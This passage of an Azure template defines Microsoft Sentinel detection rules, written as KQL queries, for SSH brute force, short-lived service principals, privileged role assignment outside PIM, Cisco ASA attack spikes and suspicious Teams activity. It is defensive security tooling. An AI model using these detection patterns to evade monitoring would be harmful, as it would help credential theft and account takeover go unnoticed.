        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a0a4eb26-d19f-4f38-b4ea-4d9b1376680c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a0a4eb26-d19f-4f38-b4ea-4d9b1376680c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SSH - Potential Brute Force",
          "description": "Identifies an IP address that had 15 failed attempts to sign in via SSH in a 4 hour block during a 24 hour time period.\n Please note that entity mapping for arrays is not supported, so when there is a single value in an array, we will pull that value from the array as a single string to populate the entity to support entity mapping features within Sentinel. Additionally, if the array is multivalued, we will input a string to indicate this with a unique hash so that matching will not occur.\n As an example - ComputerList is an array that we check for a single value and write that into the HostName field for use in the entity mapping within Sentinel.",
          "severity": "Low",
          "enabled": true,
          "query": "let threshold = 15;\nSyslog\n| where ProcessName =~ \"sshd\"\n| where SyslogMessage contains \"Failed password for invalid user\"\n| parse kind=relaxed SyslogMessage with * \"invalid user \" user \" from \" ip \" port\" port \" ssh2\" *\n// using distinct below as it has been seen that Syslog can duplicate entries depending on implementation\n| distinct TimeGenerated, Computer, user, ip, port, SyslogMessage, _ResourceId\n| summarize EventTimes = make_list(TimeGenerated), PerHourCount = count() by bin(TimeGenerated,4h), ip, Computer, user, _ResourceId\n| where PerHourCount > threshold\n| mvexpand EventTimes\n| extend EventTimes = tostring(EventTimes)\n| summarize StartTime = min(EventTimes), EndTime = max(EventTimes), UserList = make_set(user), ComputerList = make_set(Computer), ResourceIdList = make_set(_ResourceId), sum(PerHourCount) by IPAddress = ip\n// bringing through single computer and user if array only has 1, otherwise, referencing the column and hashing the ComputerList or UserList so we don't get accidental entity matches when reviewing alerts\n| extend HostName = iff(array_length(ComputerList) == 1, tostring(ComputerList[0]), strcat(\"SeeComputerListField\",\"_\", tostring(hash(tostring(ComputerList)))))\n| extend Account = iff(array_length(ComputerList) == 1, tostring(UserList[0]), strcat(\"SeeUserListField\",\"_\", tostring(hash(tostring(UserList)))))\n| extend ResourceId = iff(array_length(ResourceIdList) == 1, tostring(ResourceIdList[0]), strcat(\"SeeResourceIdListField\",\"_\", tostring(hash(tostring(ResourceIdList)))))\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "e1ce0eab-10d1-4aae-863f-9a383345ba88",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                }
              ]
            },
            {
              "entityType": "AzureResource",
              "fieldMappings": [
                {
                  "identifier": "ResourceId",
                  "columnName": "ResourceId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/593ac4f2-d198-4c1b-94e7-e0f481b82c04')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/593ac4f2-d198-4c1b-94e7-e0f481b82c04')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious Service Principal creation activity",
          "description": "This alert will detect creation of an SPN, permissions granted, credentials created, activity and deletion of the SPN in a time frame (default 10 minutes)",
          "severity": "Low",
          "enabled": true,
          "query": "let queryfrequency = 1h;\nlet wait_for_deletion = 10m;\nlet account_created =\n  AuditLogs \n  | where ActivityDisplayName == \"Add service principal\"\n  | where Result == \"success\"\n  | extend AppID = tostring(AdditionalDetails[1].value)\n  | extend creationTime = ActivityDateTime\n  | extend CreatorUserPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend CreatorIPAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress);\nlet account_activity =\n  AADServicePrincipalSignInLogs\n  | extend Activities = pack(\"ActivityTime\", TimeGenerated ,\"IpAddress\", IPAddress, \"ResourceDisplayName\", ResourceDisplayName)\n  | extend AppID = AppId\n  | summarize make_list(Activities) by AppID;\nlet account_deleted =\n  AuditLogs \n  | where OperationName == \"Remove service principal\"\n  | where Result == \"success\"\n  | extend AppID = tostring(AdditionalDetails[1].value)\n  | extend deletionTime = ActivityDateTime\n  | extend DeleterUserPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend DeleterIPAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress);\nlet account_credentials =\n  AuditLogs\n  | where OperationName has_all (\"Update application\", \"Certificates and secrets management\")\n  | where Result == \"success\"\n  | extend AppID = tostring(AdditionalDetails[1].value)\n  | extend credentialCreationTime = ActivityDateTime;\nlet roles_assigned =\n  AuditLogs\n  | where ActivityDisplayName == \"Add app role assignment to service principal\"\n  | extend AppID = tostring(TargetResources[1].displayName)\n  | extend AssignedRole =  iff(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].displayName)==\"AppRole.Value\", tostring(parse_json(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue))),\"\")\n  | extend AssignedRoles = pack(\"Role\", AssignedRole)\n  | summarize make_list(AssignedRoles) by AppID;\naccount_created\n| where TimeGenerated between (ago(wait_for_deletion+queryfrequency)..ago(wait_for_deletion))\n| join kind= inner (account_activity) on AppID\n| join kind= inner (account_deleted) on AppID\n| join kind= inner (account_credentials) on AppID\n| join kind= inner (roles_assigned) on AppID\n| where deletionTime - creationTime between (time(0s)..wait_for_deletion)\n| extend AliveTime = deletionTime - creationTime\n| project AADTenantId, AppID, creationTime, deletionTime, CreatorUserPrincipalName, DeleterUserPrincipalName, CreatorIPAddress, DeleterIPAddress, list_Activities, list_AssignedRoles, AliveTime\n| extend CreatorName = tostring(split(CreatorUserPrincipalName, \"@\")[0]), CreatorUPNSuffix = tostring(split(CreatorUserPrincipalName, \"@\")[1])\n| extend DeleterName = tostring(split(DeleterUserPrincipalName, \"@\")[0]), DeleterSuffix = tostring(split(DeleterUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078",
            "T1528"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6852d9da-8015-4b95-8ecf-d9572ee0395d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CreatorUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "CreatorName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "CreatorUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeleterUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "DeleterName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "DeleterSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CreatorIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DeleterIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5fad9c5e-9804-40c5-9159-af3809916ed4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5fad9c5e-9804-40c5-9159-af3809916ed4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Privileged Role Assigned Outside PIM",
          "description": "Identifies a privileged role being assigned to a user outside of PIM\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor-1",
          "severity": "Low",
          "enabled": true,
          "query": "AuditLogs\n| where Category =~ \"RoleManagement\"\n| where OperationName has \"Add member to role outside of PIM\"\n        or (LoggedByService =~ \"Core Directory\" and OperationName =~ \"Add member to role\" and Identity != \"MS-PIM\" and Identity != \"MS-PIM-Fairfax\")\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend TargetUserPrincipalName = tostring(TargetResource.userPrincipalName)\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend InitiatedByName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "269435e3-1db8-4423-9dfc-9bf59997da1c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatedByName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatedByUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9fdac78f-c55c-4df4-996d-5333e1a6c288')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9fdac78f-c55c-4df4-996d-5333e1a6c288')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Cisco ASA - average attack detection rate increase",
          "description": "This will help you determine if Cisco ASA devices are under heavier attack than normal over the last hour versus the previous 6 hours based on DeviceEventClassID 733100\nReferences: https://www.cisco.com/c/en/us/td/docs/security/asa/syslog/b_syslog/syslogs9.html\nDetails on how to further troubleshoot/investigate: https://www.cisco.com/c/en/us/support/docs/security/asa-5500-x-series-next-generation-firewalls/113685-asa-threat-detection.html",
          "severity": "Low",
          "enabled": false,
          "query": "let timeframe = 1h;\nlet last1h = CommonSecurityLog\n| where TimeGenerated >= ago(timeframe)\n| where isempty(CommunicationDirection)\n| where DeviceEventClassID == \"733100\"\n| extend SourceOfDropRateCount = tostring(split(tostring(split(Message, \"]\")[0]),\"[ \")[1])\n| extend splitMessage = split(Message, \".\")\n| extend DropRate = tostring(split(tostring(splitMessage[0]),\"] \")[1])\n| extend CurrentBurstRate = split(tostring(split(tostring(splitMessage[1]),\"  \")[0]),\"is \")\n| extend CurrentBurstRatePerSec = toint(split(tostring(CurrentBurstRate[1]),\" \")[0])\n| extend MaxConfiguredBurstRate = toint(CurrentBurstRate[2])\n| extend CurrentAvgRate = split(tostring(split(tostring(splitMessage[1]),\"  \")[1]),\"is \")\n| extend CurrentAvgRatePerSec = toint(split(tostring(CurrentAvgRate[1]),\" \")[0])\n| extend MaxConfiguredAvgRate = toint(CurrentAvgRate[2])\n| extend CumulativeTotal = toint(split(tostring(split(tostring(splitMessage[1]),\"  \")[2]),\"is \")[1])\n| summarize last1hCumTotal = sum(CumulativeTotal), last1hAvgRatePerSec = avg(CurrentAvgRatePerSec), last1hAvgBurstRatePerSec = avg(CurrentBurstRatePerSec) by DeviceName, DeviceEventClassID, SourceIP, SourceOfDropRateCount, DropRate;\nlet prev6h = CommonSecurityLog\n| where TimeGenerated between (ago(6h) .. ago(1h))\n| where isempty(CommunicationDirection)\n| where DeviceEventClassID == \"733100\"\n| extend SourceOfDropRateCount = tostring(split(tostring(split(Message, \"]\")[0]),\"[ \")[1])\n| extend splitMessage = split(Message, \".\")\n| extend DropRate = tostring(split(tostring(splitMessage[0]),\"] \")[1])\n| extend CurrentBurstRate = split(tostring(split(tostring(splitMessage[1]),\"  \")[0]),\"is \")\n| extend prevCurrentBurstRatePerSec = toint(split(tostring(CurrentBurstRate[1]),\" \")[0])\n| extend prevMaxConfiguredBurstRate = toint(CurrentBurstRate[2])\n| extend CurrentAvgRate = split(tostring(split(tostring(splitMessage[1]),\"  \")[1]),\"is \")\n| extend prevCurrentAvgRatePerSec = toint(split(tostring(CurrentAvgRate[1]),\" \")[0])\n| extend prevMaxConfiguredAvgRate = toint(CurrentAvgRate[2])\n| extend prevCumulativeTotal = toint(split(tostring(split(tostring(splitMessage[1]),\"  \")[2]),\"is \")[1])\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), prev6hCumTotal = sum(prevCumulativeTotal), prev6hAvgRatePerSec = avg(prevCurrentAvgRatePerSec), prev6hAvgBurstRatePerSec = avg(prevCurrentBurstRatePerSec)\nby DeviceName, DeviceEventClassID, SourceIP, SourceOfDropRateCount, DropRate;\nlast1h | join (\n  prev6h\n) on DeviceName, DeviceEventClassID, SourceIP, SourceOfDropRateCount, DropRate\n| project StartTimeUtc, EndTimeUtc, DeviceName, DeviceEventClassID, SourceIP, SourceOfDropRateCount, DropRate, last1hCumTotal, prev6hCumTotal, prev6hAvgCumTotal = prev6hCumTotal/6, last1hAvgRatePerSec, prev6hAvgRatePerSec, last1hAvgBurstRatePerSec, prev6hAvgBurstRatePerSec\n// Select only events that indicate a doubling of the expected rate in the last hour over the previous 6 hours\n| where last1hCumTotal > 2*prev6hAvgCumTotal or last1hAvgRatePerSec > 2*prev6hAvgRatePerSec or last1hAvgBurstRatePerSec > 2*prev6hAvgBurstRatePerSec\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": true,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "Impact"
          ],
          "techniques": [
            "T1046",
            "T1498"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "79f29feb-6a9d-4cdf-baaa-2daf480a5da1",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-21096')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-21096')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-21096: [RBA] Change - OfficeActivity - Teams Activity From Suspicious User",
          "description": "This detection identifies when a Microsoft Teams chat or meeting is created by a user who has shown no prior activity in the environment within the last 14 days. Such behavior may indicate account takeover, insider threat activity, or an attacker leveraging compromised credentials to establish communication channels for data exfiltration or command and control.\n\ncim_models: change MITRE: T1078,T1136,T1534,T1098,T1199 Category: BVIM,Office 365 tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let alert_id = 'BV-21096';\nlet alert_type = 'RBA';\nlet start_time = 1h;\nlet exclude_hash = true;\nlet calculate_hash = true;      \nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 47h;\nlet start_time_historical = 14d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_rule', 'bv_vendor', 'bv_dest_', 'bv_src', 'bv_comm_type'])   \n    , 'RBASCORE': 0.1      \n});\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_vendor_action1']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSIONS'], BV21096_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV21096_CONFIG['RBASCORE']),1.0);\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nlet TeamsChatAct = materialize(\nbvim_officeactivity(starttime=ago(start_time_historical), endtime=end_time, bv_tags_has='user,change')\n| project bv_start_time, bv_vendor_action, bv_vendor_product_version, bv_connector, sourcetype, bv_parser, bv_src_user, bv_src_ip, bv_dest_user, bv_src_user_type, bv_user, bv_raw, tag\n| extend bv_comm_type = tostring(parse_json(bv_raw).CommunicationType)\n  , bv_members = parse_json(bv_raw).Members\n| project-away bv_raw\n| where bv_vendor_product_version == 'MicrosoftTeams' and ((bv_vendor_action == 'ChatCreated' and bv_comm_type == 'OneOnOne') or bv_vendor_action == 'MeetingCreated')\n| extend bv_dest_user = tostring(bv_members[1].UPN)\n| where isnotempty(bv_dest_user)\n);\nlet KnownUsers = toscalar(TeamsChatAct\n| where bv_start_time <= ago(start_time)\n| summarize make_set(bv_user));\nTeamsChatAct\n| where bv_start_time > ago(start_time)\n| where bv_user !in~ (KnownUsers) and tolower(bv_user) matches regex @'\\.onmicrosoft\\.com' == false\n| summarize \n        bv_start_time = min(bv_start_time)\n        , bv_end_time = max(bv_start_time)\n        , bv_event_count = count()\n        , bv_vendor_action = make_set(bv_vendor_action, 5)\n        , bv_src_ip = make_set(bv_src_ip, 5)\n        , bv_dest_user = make_set(bv_dest_user, 5)\n        , bv_comm_type = make_set(bv_comm_type, 5)\n    by \n        bv_user\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| extend \n    bv_alarm_attacker_entities = pack_array(bv_user)\n    , bv_alarm_victim_entities = bv_dest_user            \n    , bv_mapping_tag = bv_user\n    , bv_dest_user1 = bv_dest_user[0]\n    , bv_dest_user2 = bv_dest_user[1]\n    , bv_vendor_action1 = bv_vendor_action[0]    \n| project-keep\n    bv_*   ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation",
            "Persistence",
            "DefenseEvasion",
            "LateralMovement"
          ],
          "techniques": [
            "T1078",
            "T1136",
            "T1534",
            "T1098",
            "T1199"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
